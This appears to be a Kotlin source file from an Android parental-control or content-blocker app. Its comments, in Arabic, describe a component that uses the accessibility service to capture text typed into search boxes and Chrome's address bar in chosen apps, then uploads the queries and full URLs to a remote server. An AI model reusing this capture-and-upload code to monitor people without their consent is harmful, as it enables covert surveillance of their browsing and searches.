package com.example.ytblocker

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

// ───────── سجل البحث: يسجّل آخر نص مستقر بصندوق بحث/عنوان محدد بالاسم، داخل تطبيق مسموح به فقط ─────────
// هذا مو keylogger عام: ثلاث قيود مهمة تحدّ النطاق فعلياً:
//  1) التطبيق لازم يكون بقائمة Control.getSearchApps (يوتيوب/كروم/جوجل افتراضياً، أو أي تطبيق تضيفه أمي بالاسم)
//  2) الحقل نفسه لازم يكون "صندوق بحث/عنوان" حسب معرّفه (resource-id) أو تلميحه (hint)، مو أي EditText عشوائي
//  3) نسجّل النص بعد ما يستقر لثانية ونص (يعني بعد ما يخلص المستخدم يكتب)، مو كل ضغطة حرف
// ملاحظة: بكروم هذا يشمل الروابط الكاملة اللي تُكتب بشريط العنوان (url_bar)، مو بس كلمات البحث
object SearchLog {

    private val searchIdHints = listOf(
        "search_edit_text", "search_src_text", "search_box", "searchbox",
        "omnibox", "url_bar", "search_plate", "search_text"
    )
    private val searchHintWords = listOf(
        "search", "بحث", "search youtube", "ابحث"
    )

    private val handler = Handler(Looper.getMainLooper())
    private var candApp = ""
    private var candText = ""
    private var candSince = 0L
    private var lastSentApp = ""
    private var lastSentText = ""
    private var lastSentAt = 0L

    private fun looksLikeSearchField(n: AccessibilityNodeInfo): Boolean {
        val id = n.viewIdResourceName?.substringAfter(":id/")?.lowercase() ?: ""
        if (searchIdHints.any { id.contains(it) }) return true
        val hint = (n.hintText?.toString() ?: "").lowercase()
        return searchHintWords.any { hint.contains(it) }
    }

    // يُستدعى من BlockerService على كل حدث تغيّر نص، لحقل التركيز الحالي فقط
    // يسجّل أي نص مستقر بالحقل (بحث أو رابط كامل بشريط العنوان)، طالما الحقل والتطبيق ضمن النطاق المسموح أعلاه
    fun onFocusedTextChanged(ctx: Context, pkg: String, node: AccessibilityNodeInfo, allowedApps: Set<String>) {
        if (pkg !in allowedApps) { reset(); return }
        if (!looksLikeSearchField(node)) { reset(); return }
        val text = node.text?.toString()?.trim() ?: ""
        if (text.isEmpty() || text.length < 2) { reset(); return }

        val now = System.currentTimeMillis()
        if (pkg != candApp || text != candText) {
            candApp = pkg; candText = text; candSince = now
            handler.removeCallbacksAndMessages(STABLE_TOKEN)
            handler.postAtTime({ trySend(ctx) }, STABLE_TOKEN, now + 1500)
        }
    }

    private val STABLE_TOKEN = Any()

    private fun trySend(ctx: Context) {
        val app = candApp; val text = candText
        if (app.isEmpty() || text.isEmpty()) return
        val now = System.currentTimeMillis()
        // لا نكرر نفس البحث من نفس التطبيق خلال دقيقتين (يقلل الضجيج لو رجع نفس الحقل)
        if (app == lastSentApp && text == lastSentText && now - lastSentAt < 120_000) return
        lastSentApp = app; lastSentText = text; lastSentAt = now
        upload(ctx, app, text)
    }

    private fun reset() {
        candApp = ""; candText = ""; candSince = 0L
        handler.removeCallbacksAndMessages(STABLE_TOKEN)
    }

    private fun label(ctx: Context, pkg: String): String = try {
        val pm = ctx.packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
    } catch (e: Exception) { pkg }

    private fun upload(ctx0: Context, app: String, q: String) {
        val ctx = ctx0.applicationContext
        Thread {
            try {
                val body = JSONObject().put("app", app).put("label", label(ctx, app)).put("q", q)
                val c = URL("${RemoteLists.URL_BASE}/searchlog?pair=${RemoteLists.PAIR}").openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.connectTimeout = 8000; c.readTimeout = 8000
                c.doOutput = true
                c.setRequestProperty("content-type", "application/json")
                c.outputStream.use { it.write(body.toString().toByteArray()) }
                c.responseCode
                c.disconnect()
            } catch (e: Exception) { }
        }.start()
    }
}
